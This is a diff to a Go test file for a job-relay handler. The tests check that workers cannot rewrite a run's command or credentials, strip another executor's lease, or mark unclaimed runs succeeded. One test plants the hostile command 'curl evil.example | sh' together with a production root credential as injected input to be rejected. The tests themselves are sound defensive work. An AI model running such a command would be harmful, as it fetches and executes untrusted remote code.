@@ -127,8 +127,8 @@ func TestWorkerCannotInjectOrRewriteARun(t *testing.T) {
 
 	// A run the control node accepted, after checking policy and grants.
 	original := &run.Run{
-		ID: "run_real", Playbook: "site.yml", Tool: "ansible", Status: run.StatusPending,
-		CredentialIDs: []string{"cred_readonly"}, CreatedAt: time.Now(),
+		ID: "run_real", Playbook: "site.yml", Tool: "ansible", Status: run.StatusRunning,
+		CredentialIDs: []string{"cred_readonly"}, CreatedAt: time.Now(), ClaimedBy: "worker-a",
 	}
 	if err := backing.Save(ctx, original); err != nil {
 		t.Fatalf("seed Save() error = %v", err)
@@ -136,7 +136,7 @@ func TestWorkerCannotInjectOrRewriteARun(t *testing.T) {
 
 	// A worker reporting an outcome may not also rewrite what the run executes.
 	rewritten := original.Clone()
-	rewritten.Status = run.StatusRunning
+	rewritten.Status = run.StatusSucceeded
 	rewritten.Command = "curl evil.example | sh"
 	rewritten.Tool = "bash"
 	rewritten.CredentialIDs = []string{"cred_prod_root"}
@@ -147,8 +147,8 @@ func TestWorkerCannotInjectOrRewriteARun(t *testing.T) {
 	if err != nil {
 		t.Fatalf("Get() error = %v", err)
 	}
-	if got.Status != run.StatusRunning {
-		t.Errorf("status = %q, want the reported running: a worker's outcome must land", got.Status)
+	if got.Status != run.StatusSucceeded {
+		t.Errorf("status = %q, want the reported succeeded: a worker's outcome must land", got.Status)
 	}
 	if got.Command != "" || got.Tool != "ansible" {
 		t.Errorf("a worker rewrote the spec: tool %q command %q", got.Tool, got.Command)
@@ -204,6 +204,7 @@ func TestWorkerCannotSetAStatusItHasNoBusinessSetting(t *testing.T) {
 			id := "run_status_" + strconv.Itoa(i)
 			stored := &run.Run{
 				ID: id, Playbook: "site.yml", Status: test.Stored, CreatedAt: time.Now(),
+				ClaimedBy: "worker-a",
 			}
 			if err := backing.Save(ctx, stored); err != nil {
 				t.Fatalf("seed Save() error = %v", err)
@@ -224,7 +225,8 @@ func TestWorkerCannotSetAStatusItHasNoBusinessSetting(t *testing.T) {
 	}
 
 	// The legitimate report still works.
-	live := &run.Run{ID: "run_live", Playbook: "site.yml", Status: run.StatusRunning, CreatedAt: time.Now()}
+	live := &run.Run{ID: "run_live", Playbook: "site.yml", Status: run.StatusRunning,
+		CreatedAt: time.Now(), ClaimedBy: "worker-a"}
 	if err := backing.Save(ctx, live); err != nil {
 		t.Fatalf("seed Save() error = %v", err)
 	}
@@ -235,5 +237,73 @@ func TestWorkerCannotSetAStatusItHasNoBusinessSetting(t *testing.T) {
 	}
 	if got, _ := backing.Get(ctx, "run_live"); got.Status != run.StatusSucceeded {
 		t.Errorf("status = %q, want succeeded: a worker's real outcome must land", got.Status)
+	}
+}
+
+// TestWorkerCannotStripALeaseOrReportOnAnothersRun pins that a report comes from the run's holder
+// and cannot clear who holds it.
+//
+// The lease used to be copied straight from the request body, and an omitted field decodes to the
+// empty string. A parent that is running with no holder is exactly what the abandoned-parent sweep
+// settles, so one request cleared a live split's lease and the next janitor tick interrupted the
+// run and canceled every shard. With one shared worker token, that was a remote kill switch on any
+// long-running fan-out.
+func TestWorkerCannotStripALeaseOrReportOnAnothersRun(t *testing.T) {
+	t.Parallel()
+	ctx := context.Background()
+	backing := run.NewMemStore()
+	srv := httptest.NewServer(relay.NewHandler(backing, "worker-token", zap.NewNop()))
+	defer srv.Close()
+	client := relay.NewClient(relay.NewHTTPTransport(srv.URL, "worker-token", srv.Client()))
+	held := time.Now()
+
+	// A split parent being coordinated right now.
+	parent := &run.Run{
+		ID: "run_parent", Playbook: "site.yml", Kind: run.KindSplit, Status: run.StatusRunning,
+		CreatedAt: time.Now().Add(-time.Hour), ClaimedBy: "coordinator-a", ClaimedAt: &held,
+	}
+	if err := backing.Save(ctx, parent); err != nil {
+		t.Fatalf("seed Save() error = %v", err)
+	}
+	// A report that omits the lease must not clear it.
+	strip := parent.Clone()
+	strip.ClaimedBy = ""
+	strip.ClaimedAt = nil
+	_ = client.Save(ctx, strip)
+	got, err := backing.Get(ctx, "run_parent")
+	if err != nil {
+		t.Fatalf("Get() error = %v", err)
+	}
+	if got.ClaimedBy != "coordinator-a" {
+		t.Errorf("the lease was cleared to %q, which makes the sweep settle a healthy run and "+
+			"cancel every shard under it", got.ClaimedBy)
+	}
+	if run.AbandonedParent(got, time.Now().Add(-30*time.Second)) {
+		t.Error("the parent is now sweepable, so the next janitor tick kills a coordinated run")
+	}
+
+	// A report from anyone other than the holder is refused.
+	other := parent.Clone()
+	other.ClaimedBy = "worker-b"
+	other.Status = run.StatusCanceled
+	if err := client.Save(ctx, other); err == nil {
+		t.Error("a worker canceled a run held by another executor")
+	}
+
+	// A queued run nobody claimed cannot be reported finished, which would suppress the work.
+	queued := &run.Run{
+		ID: "run_queued", Playbook: "site.yml", Status: run.StatusPending, CreatedAt: time.Now(),
+	}
+	if err := backing.Save(ctx, queued); err != nil {
+		t.Fatalf("seed Save() error = %v", err)
+	}
+	done := queued.Clone()
+	done.Status = run.StatusSucceeded
+	if err := client.Save(ctx, done); err == nil {
+		t.Error("a worker marked an unclaimed queued run succeeded, so its playbook never runs " +
+			"and nobody is told")
+	}
+	if after, _ := backing.Get(ctx, "run_queued"); after.Status != run.StatusPending {
+		t.Errorf("queued run status = %q, want it left pending", after.Status)
 	}
 }
